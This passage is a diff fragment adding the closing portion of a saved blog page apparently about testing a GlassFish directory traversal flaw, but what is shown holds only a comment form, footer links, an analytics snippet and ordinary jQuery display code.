+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="2dc3d6faab612b9d6c9f7def86790f524ae51e05"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./GlassFish 目录穿越漏洞测试过程  离别歌/2dc3d6faab612b9d6c9f7def86790f524ae51e05"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="415">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="9S5rOYHW3MEE0Tlv8TFaFvp3UXU4YUfJHcqXCsTbuzy30yJKWa9Ue9r831ncHo4T"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./GlassFish 目录穿越漏洞测试过程  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./GlassFish 目录穿越漏洞测试过程  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
